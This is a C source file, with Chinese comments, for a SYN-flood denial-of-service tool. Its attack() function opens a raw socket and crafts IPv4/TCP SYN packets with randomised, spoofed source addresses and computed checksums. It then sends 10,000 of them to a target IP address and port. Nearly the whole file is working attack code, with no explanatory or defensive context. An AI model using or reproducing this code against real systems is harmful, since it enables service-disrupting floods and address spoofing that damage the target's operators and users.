#include <stdio.h>  
#include <string.h>  
#include <errno.h>  
#include <signal.h>  
#include <sys/socket.h>  
#include <netinet/in.h>  
#include <arpa/inet.h>  
#include <linux/ip.h>  
#include <linux/tcp.h>  
#include <stdlib.h>  
#include <sys/types.h>  
#include <unistd.h> 

//校验和算法
int calc_chsum(unsigned short *addr,int len);  
 
struct sockaddr_in target;  
int rawsock;  
int attack_num = 100;
struct packet_t 
{  
        struct iphdr ip;  
        struct tcphdr tcp;  
}packet; 

struct pseudo_h 
{  
        unsigned int source_address;  
        unsigned int dest_address;  
        unsigned char placeholder;  
        unsigned char protocol;  
        unsigned short tcp_length;  
        struct tcphdr tcp;  
} pseudo_h;

void attack(char *addr, char *port) {   
    	if (inet_aton(addr, &target.sin_addr) == 0) 
	{  
       	 	printf("target ip error！\n");  
        	exit(1);  
   	}  
    	target.sin_port = htons(atoi(port));  
 
    
      
    	bzero(&packet, sizeof(packet));  
    	bzero(&pseudo_h, sizeof(pseudo_h));  

    	if ((rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) 
	{  
        	perror("socket()");  
        	exit(1);  
    	}  

    	packet.tcp.dest = target.sin_port; 
    	packet.tcp.ack_seq = 0; 
    	packet.tcp.doff = 5;  
    	packet.tcp.res1 = 0; 
    	packet.tcp.urg = 0; 
    	packet.tcp.ack = 0; 
    	packet.tcp.psh = 0; 
    	packet.tcp.rst = 0; 
    	packet.tcp.syn = 1;  
    	packet.tcp.fin = 0; 
    	packet.tcp.window = htons(242); 
    	packet.tcp.urg_ptr = 0; 
    	packet.ip.version = 4; 
    	packet.ip.ihl = 5; 
    	packet.ip.tos = 0; 
    	packet.ip.tot_len = htons(40); 
    	packet.ip.id = getpid(); 
    	packet.ip.frag_off = 0;   
    	packet.ip.ttl = 255; 
    	packet.ip.protocol = IPPROTO_TCP; 
    	packet.ip.check = 0;  
    	packet.ip.daddr = target.sin_addr.s_addr; 
    	packet.ip.check = calc_chsum((unsigned short *)&packet.ip, 20);
   	for(attack_num = 10000;attack_num > 0;attack_num --)
	{  
		packet.ip.saddr = random(); 
        	packet.tcp.source = htons(12345);  
        	packet.tcp.seq = 123456 + rand() % 100000;  
        	packet.tcp.check = 0;
        	pseudo_h.source_address = packet.ip.saddr;  
        	pseudo_h.dest_address = packet.ip.daddr;  
        	pseudo_h.placeholder = 0;  
        	pseudo_h.protocol = IPPROTO_TCP;  
        	pseudo_h.tcp_length = htons(20);  
        	bcopy((char *) &packet.tcp, (char *) &pseudo_h.tcp, 20);  
        	packet.tcp.check = calc_chsum((unsigned short *)&pseudo_h, 32);
        	sendto(rawsock, &packet, 40, 0, (struct sockaddr *) &target,  
                sizeof(target));  
    	}   
}  
 

//校验和算法
int calc_chsum(unsigned short *addr,int len)
{
    int sum = 0,n = len;
    unsigned short answer = 0;
    unsigned short *p = addr;
    
    //每两个字节相加
    while(n > 1)
    {
        sum += *p ++;
        n -= 2;
    }
    
    //处理数据大小是奇数，在最后一个字节后面补0
    if(n == 1)
    {
        *((unsigned char *)&answer) = *(unsigned char *)p;
        sum += answer;
    }
    
    //将得到的sum值的高2字节和低2字节相加
    sum = (sum >> 16) + (sum & 0xffff);
    
    //处理溢出的情况
    sum += sum >> 16;
    answer = ~sum;

    return answer;
}
